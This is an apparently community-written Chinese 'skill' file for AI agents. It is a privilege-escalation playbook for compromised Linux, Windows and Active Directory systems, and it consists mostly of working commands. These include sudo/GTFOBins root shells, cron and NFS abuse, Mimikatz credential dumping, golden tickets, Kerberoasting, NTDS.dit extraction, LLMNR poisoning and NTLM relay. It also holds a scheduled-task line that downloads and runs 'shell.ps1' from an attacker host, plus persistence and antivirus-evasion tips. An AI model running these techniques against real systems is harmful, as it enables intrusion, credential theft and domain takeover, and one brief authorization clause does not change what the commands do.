---
name: privilege-escalation-methods
description: "提供从低权限用户提升至 root/管理员权限的完整技术方法，覆盖已入侵的 Linux 和 Windows 系统。适用于渗透测试后渗透阶段和红队行动。触发词：权限提升、提权、privilege escalation、Linux提权、Windows提权、sudo提权、SUID提权、AD攻击、Kerberoasting、Golden Ticket"
risk: unknown
source: community
author: zebbern
date_added: "2026-02-27"
---

# 权限提升方法

## 目的

提供从低权限用户提升至 root/管理员权限的完整技术方法，覆盖已入侵的 Linux 和 Windows 系统。适用于渗透测试后渗透阶段和红队行动。

## 输入/前置条件

- 目标系统上的低权限 shell 访问
- Kali Linux 或渗透测试发行版
- 工具：Mimikatz、PowerView、PowerUpSQL、Responder、Impacket、Rubeus
- 理解 Windows/Linux 权限模型
- AD 攻击场景：域用户凭据及到 DC 的网络访问

## 输出/交付物

- root 或管理员 shell 访问
- 提取的凭据和哈希
- 持久化访问机制
- 域渗透（AD 环境）

---

## 核心技术

### Linux 权限提升

#### 1. 滥用 Sudo 二进制文件

利用配置错误的 sudo 权限，结合 GTFOBins 技术进行提权：

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. 滥用定时任务（Cron）

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
/bin/bash -p
```

#### 3. 滥用 Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. MySQL 以 root 身份运行

```bash
# If MySQL runs as root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---

### Windows 权限提升

#### 1. Token 模拟

```powershell
# Using SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Using SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. 服务滥用

```powershell
# Using PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. 滥用 SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. 滥用 SeLoadDriverPrivilege

```powershell
# Load vulnerable Capcom driver
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. 滥用 GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---

### Active Directory 攻击

#### 1. Kerberoasting

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. Golden Ticket（黄金票据）

```powershell
# DCSync to get krbtgt hash
mimikatz# lsadump::dcsync /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. Pass-the-Ticket（票据传递）

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verify ticket
```

#### 5. Golden Ticket 结合定时任务

```powershell
# 1. Elevate and dump credentials
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Create golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Create scheduled task
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---

### 凭据收集

#### LLMNR 投毒

```bash
# Start Responder
responder -I eth1 -v

# Create malicious shortcut (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM Relay（中继）

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### 使用 VSS 转储

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## 快速参考

| 技术 | 操作系统 | 需要域环境 | 工具 |
|------|----------|------------|------|
| Sudo 二进制滥用 | Linux | 否 | GTFOBins |
| Cron 任务利用 | Linux | 否 | 手动操作 |
| Capability 滥用 | Linux | 否 | getcap |
| NFS no_root_squash | Linux | 否 | mount |
| Token 模拟 | Windows | 否 | SweetPotato |
| 服务滥用 | Windows | 否 | PowerUp |
| Kerberoasting | Windows | 是 | Rubeus/Impacket |
| AS-REP Roasting | Windows | 是 | Rubeus |
| Golden Ticket | Windows | 是 | Mimikatz |
| Pass-the-Ticket | Windows | 是 | Rubeus |
| DCSync | Windows | 是 | Mimikatz |
| LLMNR 投毒 | Windows | 是 | Responder |

---

## 约束条件

**必须：**
- 在尝试提权前获得初始 shell 访问权限
- 选择技术前先确认目标操作系统和环境
- 区分域提权和本地提权，使用对应工具

**禁止：**
- 未经授权在生产系统上尝试提权技术
- 未经客户批准留下持久化机制
- 忽略检测机制（EDR、SIEM）

**建议：**
- 利用前进行充分的枚举
- 记录所有成功的提权路径
- 任务结束后清理痕迹

---

## 示例

### 示例 1：Linux Sudo 提权到 root

```bash
# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Exploit vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 示例 2：Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| sudo -l 需要密码 | 尝试其他枚举方式（SUID、cron、capabilities） |
| Mimikatz 被杀毒软件拦截 | 使用 Invoke-Mimikatz 或 SafetyKatz |
| Kerberoasting 未返回哈希 | 检查是否有带 SPN 的服务账户 |
| Token 模拟失败 | 确认 SeImpersonatePrivilege 是否存在 |
| NFS 挂载失败 | 检查 NFS 版本兼容性（vers=2,3,4） |

---

## 补充资源

如需详细的枚举脚本，请使用：
- **LinPEAS**：Linux 权限提升枚举工具
- **WinPEAS**：Windows 权限提升枚举工具
- **BloodHound**：Active Directory 攻击路径映射
- **GTFOBins**：Unix 二进制利用参考

## 适用场景
本技能适用于执行概述中描述的工作流或操作。